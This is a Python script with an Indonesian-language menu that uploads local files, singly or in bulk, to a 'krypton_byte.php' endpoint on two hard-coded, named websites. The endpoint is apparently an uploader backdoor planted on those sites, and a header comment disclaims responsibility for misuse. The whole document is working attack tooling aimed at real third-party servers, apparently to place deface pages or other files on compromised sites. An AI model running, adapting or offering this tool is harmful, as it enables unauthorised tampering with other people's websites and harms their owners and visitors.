#!/usr/bin/python
#silahkan recode, dosa tanggung sendiri !
from threading import *
import requests,os,time,sys
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
class upload:
	def __init__(self, media, url):
		self.media = media
		self.url = url
	def upload(self):
		if self.media in os.listdir(os.getcwd()):
			htm={'file':open(self.media,'r')}
			if '<script>alert("UPLOAD SUKSES");</script>' in requests.post(self.url, files = htm,data={'_upl':'Upload'}).text :
				return b+subdo+tip.replace('krypton_byte.php','')+self.media+h+'\tsukses'
			else:
				return b+subdo+tip.replace('krypton_byte.php','')+self.media+m+'\tgagal'
		else:
			return m+"file tidak ada"+p
def logo():
	os.system('clear')
	banner=''' █    ██  ██▓███   ██▓     ▒█████   ▄▄▄      ▓█████▄ ▓█████  ██▀███     
 ██  ▓██▒▓██░  ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒   
▓██  ▒██░▓██░ ██▓▒▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌▒███   ▓██ ░▄█ ▒   
▓▓█  ░██░▒██▄█▓▒ ▒▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄     
▒▒█████▓ ▒██▒ ░  ░░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ ░▒████▒░██▓ ▒██▒   
░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░   
░░▒░ ░ ░ ░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░   
 ░░░ ░ ░ ░░         ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░    ░     ░░   ░    
   ░                  ░  ░    ░ ░        ░  ░   ░       ░  ░   ░        
                                              ░                         
'''
	return m+banner+'\n'+'-'*65+'\n'
def link():
	print(logo())
	global subdo
	print(u+'pilih URL\n'+k+"\t1. http://metadatacleaner.com/\n\t2. http://papaclash.com/")
	pil=str(input(h+"pilih : "+u))
	if ( pil == '1' or pil == '01' ):
		subdo = 'http://metadatacleaner.com/'
		tipe()
	elif ( pil == '2' or pil == '02' ):
		subdo = 'http://papaclash.com/'
		tipe()
	else:
		print('\t'+m+"[x] pilihan anda belum tersedia")
		time.sleep(2)
		link()
def tipe():
	print(logo())
	global tip
	print(u+"pilih format upload\n\t"+k+"1. dokumen html/htm\n\t2. logo jpg/png\n\t3. musik mp3/wav")
	krypt=str(input(h+'pilih tipe : '+u))
	if( krypt == '1' or krypt == '01' ):
		tip = 'artictle/krypton_byte.php'
		kryptonbyte()
	elif( krypt == '2' or krypt == '02' ):
		tip = 'logo/krypton_byte.php'
		kryptonbyte()
	elif( krypt == '3' or krypt == '03' ):
		tip = 'sounds/krypton_byte.php'
		kryptonbyte()
	else:
		print(m+"\t[x] pilihan anda belum tersedia")
		time.sleep(2)
		tipe()
def kryptonbyte():
	f=str(input(h+'Multi File Y/T : '+u))
	if ( f == 'Y' or f =='y' ):
		multi_file()
	elif ( f == 'T' or f == 't'):
		single_file()
	else:
		print(m+"\tpilihan tidak ada")
		time.sleep(2)
		kryptonbyte()
def single_file():
	media=str(input(h+'file : '+u))
	up=upload
	l=up(media = media, url = subdo+tip)
	print(m+'[!]'+h+' mohon bersabar')
	print(l.upload())
def multi_file():
	media=[]
	for i in range(int(input(h+'jumlah file :'+u))):
		media.append(str(input(h+'file ke -'+str(int(i+1))+' : '+u)))
	print(m+'[!]'+h+' mohon bersabar.....')
	for upl in range(int(len(media))):
		up=upload
		l=up(media[upl],url = subdo+tip)
		print(l.upload())


link()
